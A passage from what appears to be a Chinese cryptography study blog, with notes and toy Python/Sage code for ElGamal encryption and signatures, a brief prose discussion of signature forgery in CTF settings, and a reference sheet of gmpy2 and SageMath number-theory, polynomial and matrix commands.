href="#加密" class="headerlink" title="加密"></a>加密</h4><p><strong>Bob</strong></p><ol><li>选择大素数p、其生成元g，以及自己的私钥x（1&lt;x&lt;p−1）</li><li>生成$y ≡ g^x \mod p$</li><li><strong>公布</strong>公钥为(y,g,p)</li></ol><p><strong>Alice</strong></p><ol><li>处理一下明文格式，对明文分组，使得每组m小于十进制下的p（这里为方便理解，假设只有1组）</li><li>随机选择r（1&lt; ri &lt; p−1）</li><li>生成<ul><li>$c ≡ g^r \mod p$</li><li>$c’ ≡ m * y^r \mod p$</li></ul></li><li>公布密文C（c, c’）</li></ol><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p><strong>Bob</strong></p><p>$m ≡ c’ *(c^x)^{-1} \mod p$</p><p><strong>证明</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220511193333741.png" alt="Elgamal解密证明"></p><h4 id="类比"><a href="#类比" class="headerlink" title="类比"></a>类比</h4><p>过了一遍流程后，发现Elgamal确实是基于DH协议的</p><p>相当于DH协议产生好私密的密钥K后，采用加密方式$C = m * K \mod p$，解密即：$m = C*K^{-1} \mod p$</p><p>正常而言，攻击者在不充当中间人的前提下无法得知K，也就无法得知$K^{-1}$,从而无法解出m</p><p>换句话说，收到消息后的Bob还可以用K加密他给Alice的回复,这同样也是安全的</p><p>再换言之，现实世界里<strong>中间人攻击</strong>依旧对Elgamal加密有效</p><p>（但ctf题目采用不了此方法，只能寄希望于特殊情况的离散对数可求解）</p><h4 id="总流程"><a href="#总流程" class="headerlink" title="总流程"></a>总流程</h4><p>贴一下la佬的干练精简<a href="https://lazzzaro.github.io/2020/05/13/crypto-其他加密算法/">博客相关内容</a></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221107095832290.png" alt="image-20221107095832290"></p><h4 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h4><p>小改了下来自<a href="https://4xwi11.github.io/posts/898249b7/#ElGamal加密方案">4XWi11师傅的代码</a></p><p><strong>为与DH协议承上启下，Elgamal加解密过程 相关变量名 是按DH协议命名的</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long <span class="keyword">as</span> b2n, long_to_bytes <span class="keyword">as</span> n2b</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_t</span>(<span class="params">a, m, n</span>):</span></span><br><span class="line">    _y = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> m &gt; <span class="number">0</span>:</span><br><span class="line">        r = m % <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            _y = (_y * a) % n</span><br><span class="line">        a = a * a % n</span><br><span class="line">        m = m // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> _y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primitive_root</span>(<span class="params">pi</span>):</span>  <span class="comment"># 找对于模p的有效生成元g</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, pi):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, pi):</span><br><span class="line">            <span class="keyword">if</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i &lt; pi - <span class="number">1</span>:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> flag <span class="keyword">and</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i == pi - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = getPrime(<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;素数p :&quot;</span>, q)</span><br><span class="line">g = primitive_root(q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;生成元g是 : &quot;</span>, g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># key generation</span></span><br><span class="line">XA = randint(<span class="number">1</span>, q)</span><br><span class="line">XB = randint(<span class="number">1</span>, q)</span><br><span class="line"></span><br><span class="line">YA = <span class="built_in">pow</span>(g, XA, q)</span><br><span class="line">YB = <span class="built_in">pow</span>(g, XB, q)</span><br><span class="line"></span><br><span class="line">pk = [q, g, YA]  <span class="comment"># 公钥</span></span><br><span class="line">sk = XA  <span class="comment"># 私钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># encryption</span></span><br><span class="line">flag = <span class="string">b&quot;f&quot;</span></span><br><span class="line">m = b2n(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">ci = <span class="built_in">pow</span>(g, XB, q)  <span class="comment"># 密文第一部分</span></span><br><span class="line">ciphertext = m * <span class="built_in">pow</span>(YA, XB, q) % q  <span class="comment"># Bob用自己的密钥XB来加密（密文第二部分）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># decryption</span></span><br><span class="line">mi = ciphertext * invert(<span class="built_in">pow</span>(ci, XA, q), q) % q  <span class="comment"># Alice用自己的密钥XA即可解密</span></span><br><span class="line"><span class="built_in">print</span>(n2b(mi))</span><br></pre></td></tr></table></figure><h3 id="Elgamal数字签名"><a href="#Elgamal数字签名" class="headerlink" title="Elgamal数字签名"></a>Elgamal数字签名</h3><ul><li><a href="https://lazzzaro.github.io/2020/05/13/crypto-其他加密算法/">参考</a></li></ul><h4 id="签名流程"><a href="#签名流程" class="headerlink" title="签名流程"></a>签名流程</h4><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220511200814777.png" alt="Elgamal数字签名"></p><blockquote><p>没看懂签名🤔</p><p>A要发东西，A签名后产生了r,s</p><p>那么也就是其他人利用验证里公式能确定这就是A发的密文，但验证里有m，除A之外的其他人不是不知道m吗？</p><p>那是怎么验证的？</p><p>或许是说，A还得<strong>公布</strong>$g^m$？</p></blockquote><p>看完攻击后，我明白了（说到底是没明白数字签名的意义何在）<strong>签名中的m是公开的</strong></p><p>签名的直接目的不是为了加密、保证安全性，而是让人能确定这m就是你所生成、你所发出的</p><p>至于实际应用层面，我想可以直接把上文中的<strong>m换成</strong>Elgamal加密所得的<strong>密文</strong>，对此签名即可避免中间人攻击</p><h4 id="相关攻击"><a href="#相关攻击" class="headerlink" title="相关攻击"></a>相关攻击</h4><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220511200845472.png" alt="Elgamal数字攻击"></p><p>第一次学习具体的数字签名以及攻击、构造验证，比较迟钝哈哈</p><p>这里构造验证的意义在于，在不知道私钥r（你不是A）的前提下，也能发出你的m、签名，让别人验证后，觉得这就是A发出来的（你就是A）</p><p>但仔细思考，这构造出的m是不由自己控制的，也就是说虽然别人认可这是A发的，但读起来是乱码，构造验证便也没有特别直接的意义（CTF上倒是能拿此出题）</p><p>但，话说回来，如果是人与人之间交互</p><p>另一方验证完后，直接把你当作A了，然后再进行的交流则意义不菲</p><p>（完）</p>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学概念的Sage实现</title>
      <link href="/2022/05/10/Sage%E5%BA%94%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2022/05/10/Sage%E5%BA%94%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="数学概念的sage实现"><a href="#数学概念的sage实现" class="headerlink" title="数学概念的sage实现"></a>数学概念的sage实现</h1><blockquote><p>第一次学习，参考<a href="https://lazzzaro.github.io/2020/05/10/crypto-crypto常用工具/">la佬博客</a>Orz</p><p>la佬写的精简干练，一度以为不是在记笔记而是转载XD</p><p>第二次完善，拜读<a href="https://jayxv.github.io/2020/05/20/sage常用命令/">V神的文章</a></p><p>第三次总结，研读<a href="https://www.osgeo.cn/sagemath/prep/Quickstarts/Linear-Algebra.html">sage中文文档</a> &amp; <a href="https://wiki.sagemath.org/quickref?action=AttachFile&do=get&target=quickref-linalg.pdf">Sage Quick Reference: Linear Algebra</a></p></blockquote><h2 id="gmpy2"><a href="#gmpy2" class="headerlink" title="gmpy2"></a>gmpy2</h2><blockquote><p>gmpy2 是python里一个优秀的数论相关库</p></blockquote><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> gmpy2</span><br><span class="line">gmpy2.mpz(n)<span class="comment">#初始化一个大整数</span></span><br><span class="line">gmpy2.mpfr(x)<span class="comment"># 初始化一个高精度浮点数x</span></span><br><span class="line"><span class="attr">d</span> = gmpy2.invert(e,n) <span class="comment"># 求逆元，de = 1 mod n</span></span><br><span class="line"><span class="attr">c</span> = gmpy2.powmod(m,e,n)<span class="comment"># 幂取模，结果是 c = m^e mod n</span></span><br><span class="line">gmpy2.is_prime(n) <span class="comment">#素性检测</span></span><br><span class="line">gmpy2.gcd(a,b)  <span class="comment">#欧几里得算法，最大公约数</span></span><br><span class="line">gmpy2.gcdext(a,b)  <span class="comment">#扩展欧几里得算法</span></span><br><span class="line">gmpy2.iroot(x,n) <span class="comment">#x开n次根</span></span><br></pre></td></tr></table></figure><h3 id="陌生"><a href="#陌生" class="headerlink" title="陌生"></a>陌生</h3><ul><li><code>gmpy2.mpz(n)    #初始化一个大整数</code></li><li><code>gmpy2.mpfr(x)    # 初始化一个高精度浮点数x</code></li></ul><h2 id="Sage"><a href="#Sage" class="headerlink" title="Sage"></a>Sage</h2><h3 id="R-lt-X-gt-PolynomialRing-Zmod-n"><a href="#R-lt-X-gt-PolynomialRing-Zmod-n" class="headerlink" title="R.&lt;X&gt; = PolynomialRing(Zmod(n))"></a><code>R.&lt;X&gt; = PolynomialRing(Zmod(n))</code></h3><ul><li><p>Zmod(n):</p><ul><li>n: 指定模为n的环</li><li>Z: 表示整数</li></ul><blockquote><p>有效的数字只有从0到n，其他的都通过与n取模来保证在0～n这个范围内</p></blockquote></li><li><p>参数介绍</p><ul><li>ZZ：整数环</li><li>QQ: 有理数环</li><li>RR：实数环</li><li><strong>CC：复数环</strong></li></ul></li><li><p>PolynomialRing</p><p><strong>建立多项式环</strong></p></li></ul><ul><li><p><strong>R</strong></p><p><strong>指针</strong>，指向用PolynomialRing指定的那个环.</p><p>实际上用什么字母都可以</p></li><li><p><code>.&lt;X&gt;</code></p><p>指定一个变量</p></li></ul><h3 id="数论相关"><a href="#数论相关" class="headerlink" title="数论相关"></a>数论相关</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">prime_pi(n)  <span class="comment">#小于等于n的素数个数</span></span><br><span class="line">divisors(n)  <span class="comment">#n的因子</span></span><br><span class="line">number_of_divisors(n)  <span class="comment">#n的因子总数</span></span><br><span class="line">factor(n)  <span class="comment">#n的因式分解</span></span><br><span class="line">euler_phi(n)  <span class="comment">#n的欧拉函数值</span></span><br><span class="line">three_squares(n)  <span class="comment">#n的三数平方组合</span></span><br><span class="line">four_squares(n)  <span class="comment">#n的四数平方组合</span></span><br><span class="line"></span><br><span class="line">d = inverse_mod(e,fn) <span class="comment"># sage求e对模fn的逆元d</span></span><br><span class="line">d,u,v=xgcd(<span class="number">20</span>,<span class="number">30</span>)  <span class="comment"># 扩展欧几里得算法</span></span><br><span class="line"><span class="comment"># d = gcd(20,30) = 20*u + 30*v</span></span><br></pre></td></tr></table></figure><h4 id="陌生-1"><a href="#陌生-1" class="headerlink" title="陌生"></a>陌生</h4><ul><li><p><code>prime_pi(n)</code></p></li><li><p><code>divisors(n)</code> and <code>number_of_divisors(n)</code></p></li><li><p><code>three_squares(n)</code> and <code>four_squares(n)</code></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="name">three_squares</span>(<span class="number">78</span>))</span><br><span class="line"># (<span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="name">four_squares</span>(<span class="number">78</span>))</span><br><span class="line"># (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">8</span>)</span><br></pre></td></tr></table></figure></li></ul><h4 id="factor"><a href="#factor" class="headerlink" title="factor"></a>factor</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ms = [<span class="number">284461942441737992421992210219060544764</span>, <span class="number">218436209063777179204189567410606431578</span>,</span><br><span class="line">      <span class="number">288673438109933649911276214358963643204</span>, <span class="number">239232622368515797881077917549177081575</span>,</span><br><span class="line">      <span class="number">206264514127207567149705234795160750411</span>, <span class="number">338915547568169045185589241329271490503</span>,</span><br><span class="line">      <span class="number">246545359356590592172327146579550739141</span>, <span class="number">219686182542160835171493232381209438048</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ms:</span><br><span class="line">    <span class="built_in">print</span>(factor(i))</span><br><span class="line">    <span class="built_in">print</span>(factor(i)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p><strong>输出</strong></p><p>(a, b)</p><ul><li>a为底数</li><li>b为幂</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>^<span class="number">2</span> * <span class="number">7</span> * <span class="number">11</span> * <span class="number">37</span> * <span class="number">4931</span> * <span class="number">68447</span> * <span class="number">19044797</span> * <span class="number">3883344883673875271</span></span><br><span class="line">(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">2</span> * <span class="number">23</span> * <span class="number">430811</span> * <span class="number">145978487</span> * <span class="number">6348599837</span> * <span class="number">11893596584627</span></span><br><span class="line">(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"><span class="number">2</span>^<span class="number">2</span> * <span class="number">11</span> * <span class="number">6560759957043946588892641235430991891</span></span><br><span class="line">(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">3</span>^<span class="number">2</span> * <span class="number">5</span>^<span class="number">2</span> * <span class="number">359</span> * <span class="number">790756753</span> * <span class="number">3745419995624210070676241</span></span><br><span class="line">(<span class="number">3</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">593</span> * <span class="number">1037401</span> * <span class="number">16138908347</span> * <span class="number">20775381485756890441</span></span><br><span class="line">(<span class="number">593</span>, <span class="number">1</span>)</span><br><span class="line"><span class="number">3</span> * <span class="number">11</span> * <span class="number">19</span> * <span class="number">835427</span> * <span class="number">647016631717189608780181516607</span></span><br><span class="line">(<span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line"><span class="number">53</span> * <span class="number">6189511</span> * <span class="number">10973906636081</span> * <span class="number">68486246189098967</span></span><br><span class="line">(<span class="number">53</span>, <span class="number">1</span>)</span><br><span class="line"><span class="number">2</span>^<span class="number">5</span> * <span class="number">3</span> * <span class="number">17</span> * <span class="number">109</span> * <span class="number">148008571</span> * <span class="number">689385523</span> * <span class="number">12103391051447837</span></span><br><span class="line">(<span class="number">2</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>它不是查询，sage会正儿八经地给你跑算法拆n</p><h3 id="多项式"><a href="#多项式" class="headerlink" title="多项式"></a>多项式</h3><ul><li><p>杂</p><ul><li><p><code>f.subs(&#123;x:x1&#125;)</code></p><p>把x1值代入x</p></li><li><p><code>f.univariate_polynomial()</code></p><p><strong>univariate单变量的</strong>，映射为单变量多项式</p></li><li><p><code>f.univariate_polynomial().roots()</code></p><p>单变量多项式求根</p></li><li><p><code>f.coefficients()</code></p><p><strong>coefficient系数</strong>，多项式系数列表</p></li><li><p><code>f.monic()</code></p><p><strong>monicpolynomial首个系数为1的多项式</strong></p></li></ul></li><li><p>单元·因式分解</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">x</span> = PolynomialRing(RationalField(), &#x27;x&#x27;).gen()</span><br><span class="line"><span class="comment"># RationalField有理域</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">f</span> = (x^<span class="number">3</span> - <span class="number">1</span>)^<span class="number">2</span>-(x^<span class="number">2</span>-<span class="number">1</span>)^<span class="number">2</span></span><br><span class="line"><span class="attribute">f</span>.factor()</span><br><span class="line"><span class="comment"># (x - 1)^2 * x^2 * (x^2 + 2*x + 2)</span></span><br></pre></td></tr></table></figure></li><li><p>二元·因式分解</p><figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">x, y = PolynomialRing(RationalField(), </span><span class="number">2</span><span class="xml">, [&#x27;x&#x27;,&#x27;y&#x27;]).gens()</span></span><br><span class="line"><span class="xml">f =  (</span><span class="number">9</span><span class="xml">*y</span><span class="keyword">^6</span><span class="xml"> - </span><span class="number">9</span><span class="xml">*x</span><span class="keyword">^2</span><span class="xml">*y</span><span class="keyword">^5</span><span class="xml"> - </span><span class="number">18</span><span class="xml">*x</span><span class="keyword">^3</span><span class="xml">*y</span><span class="keyword">^4</span><span class="xml"> - </span><span class="number">9</span><span class="xml">*x</span><span class="keyword">^5</span><span class="xml">*y</span><span class="keyword">^4</span><span class="xml"> + </span><span class="number">9</span><span class="xml">*x</span><span class="keyword">^6</span><span class="xml">*y</span><span class="keyword">^2</span><span class="xml"> + </span><span class="number">9</span><span class="xml">*x</span><span class="keyword">^7</span><span class="xml">*y</span><span class="keyword">^3</span><span class="xml"> + </span><span class="number">18</span><span class="xml">*x</span><span class="keyword">^8</span><span class="xml">*y</span><span class="keyword">^2</span><span class="xml"> - </span><span class="number">9</span><span class="xml">*x</span><span class="keyword">^11</span><span class="xml">)</span></span><br><span class="line"><span class="xml">f.factor()</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="comment"># (9) * (-x^5 + y^2) * (x^6 - 2*x^3*y^2 - x^2*y^3 + y^4)</span></span><br></pre></td></tr></table></figure></li><li><p>单元·GCD</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">x</span> <span class="operator">=</span> PolynomialRing(RationalField()<span class="punctuation">,</span> &#x27;<span class="keyword">x</span>&#x27;).gen()</span><br><span class="line">f <span class="operator">=</span> <span class="number">3</span>*<span class="keyword">x</span>^<span class="number">3</span> + <span class="keyword">x</span></span><br><span class="line">g <span class="operator">=</span> <span class="number">9</span>*<span class="keyword">x</span>*(<span class="keyword">x</span>+<span class="number">1</span>)</span><br><span class="line">f.gcd(g)</span><br><span class="line"></span><br><span class="line"># <span class="keyword">x</span></span><br></pre></td></tr></table></figure></li><li><p>多元·GCD</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">R.&lt;<span class="keyword">x</span><span class="punctuation">,</span>y<span class="punctuation">,</span>z&gt; <span class="operator">=</span> PolynomialRing(RationalField()<span class="punctuation">,</span> order<span class="operator">=</span>&#x27;lex&#x27;)</span><br><span class="line">f <span class="operator">=</span> <span class="number">3</span>*<span class="keyword">x</span>^<span class="number">2</span>*(<span class="keyword">x</span>+y)</span><br><span class="line">g <span class="operator">=</span> <span class="number">9</span>*<span class="keyword">x</span>*(y^<span class="number">2</span> - <span class="keyword">x</span>^<span class="number">2</span>)</span><br><span class="line">f.gcd(g)</span><br><span class="line"></span><br><span class="line"># <span class="keyword">x</span>^<span class="number">2</span> + <span class="keyword">x</span>*y</span><br></pre></td></tr></table></figure></li></ul><h3 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h3><ul><li><p>矩阵的定义</p><ul><li><p><code>A = matrix(定义域, 值)</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A = matrix(ZZ, [[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">4</span>]])</span><br><span class="line"><span class="comment"># 创建了定义域在整数环的矩阵</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[[1, 1]</span></span><br><span class="line"><span class="string"> [0, 4]]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>也可以交代清楚指定的行数与列数</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">F1</span>=matrix(QQ,<span class="number">2</span>,<span class="number">2</span>,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>])<span class="meta"></span></span><br><span class="line"><span class="meta">[0,1]</span><span class="meta"></span></span><br><span class="line"><span class="meta">[1.0]</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>列向量置入定义</p><p>每个向量以列向量的形式置入矩阵</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sage</span>: column_matrix(QQ,[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]])<span class="meta"></span></span><br><span class="line"><span class="meta">[1 4 7]</span><span class="meta"></span></span><br><span class="line"><span class="meta">[2 5 8]</span><span class="meta"></span></span><br><span class="line"><span class="meta">[3 6 9]</span></span><br></pre></td></tr></table></figure></li><li><p>矩阵组合定义</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sage</span>: F<span class="number">1</span>=matrix(QQ,<span class="number">2</span>,<span class="number">2</span>,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>])</span><br><span class="line"><span class="attribute">sage</span>: F<span class="number">2</span>=matrix(QQ,<span class="number">2</span>,<span class="number">2</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line"><span class="attribute">sage</span>: F<span class="number">3</span>=matrix(QQ,<span class="number">1</span>,<span class="number">2</span>,[<span class="number">3</span>,<span class="number">1</span>])</span><br><span class="line"><span class="attribute">sage</span>: block_matrix(<span class="number">2</span>,<span class="number">2</span>,[F<span class="number">1</span>,F<span class="number">2</span>,<span class="number">0</span>,F<span class="number">3</span>])<span class="meta"></span></span><br><span class="line"><span class="meta">[0 1|1 2]</span><span class="meta"></span></span><br><span class="line"><span class="meta">[1 0|3 4]</span><span class="meta"></span></span><br><span class="line"><span class="meta">[---+---]</span><span class="meta"></span></span><br><span class="line"><span class="meta">[0 0|3 1]</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>向右生长</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sage</span>: F<span class="number">1</span>.augment(F<span class="number">2</span>)<span class="meta"></span></span><br><span class="line"><span class="meta">[0 1 1 2]</span><span class="meta"></span></span><br><span class="line"><span class="meta">[1 0 3 4]</span></span><br></pre></td></tr></table></figure></li><li><p>向下生长</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sage</span>: F<span class="number">1</span>.stack(F<span class="number">2</span>)<span class="meta"></span></span><br><span class="line"><span class="meta">[0 1]</span><span class="meta"></span></span><br><span class="line"><span class="meta">[1 0]</span><span class="meta"></span></span><br><span class="line"><span class="meta">[1 2]</span><span class="meta"></span></span><br><span class="line"><span class="meta">[3 4]</span></span><br></pre></td></tr></table></figure></li><li><p>以块为单位的对角阵</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sage</span>: block_diagonal_matrix([F<span class="number">1</span>,F<span class="number">2</span>])<span class="meta"></span></span><br><span class="line"><span class="meta">[0 1|0 0]</span><span class="meta"></span></span><br><span class="line"><span class="meta">[1 0|0 0]</span><span class="meta"></span></span><br><span class="line"><span class="meta">[---+---]</span><span class="meta"></span></span><br><span class="line"><span class="meta">[0 0|1 2]</span><span class="meta"></span></span><br><span class="line"><span class="meta">[0 0|3 4]</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>矩阵属性</p><ul><li><p><code>A.nrows()</code></p><p>矩阵行数</p></li><li><p><code>A.ncols()</code></p><p>矩阵列数</p></li><li><p>V.dimension()</p><p>查看v矩阵的维度</p></li><li><p><code>A.transpose()</code></p><p>转置</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220509232716405.png" alt="矩阵转置"></p></li><li><p><code>A.inverse()</code></p><p>矩阵的逆</p></li><li><p><code>A.rank()</code></p><p>矩阵的秩</p></li><li><p><code>A.det()</code></p><p>将矩阵转换为行列式</p></li><li><p><code>A.stack(vector([1,2]))</code></p><p>矩阵末添加一行（向量）</p></li><li><p><code>A.insert_row(n, vector([1,2]))</code></p><p>在矩阵第n行插入（向量）</p></li><li><p><code>A.change_ring(QQ)</code></p><p>更换环为QQ（有理数环）</p></li><li><p><code>A.solve_left(B)</code> 或<code>A/B</code></p><p>求解XA=B</p></li><li><p><code>A.solve_right(B)</code> 或 <code>A\B</code></p><p>求解AX=B</p></li><li><p><code>A.left_kernel()</code> 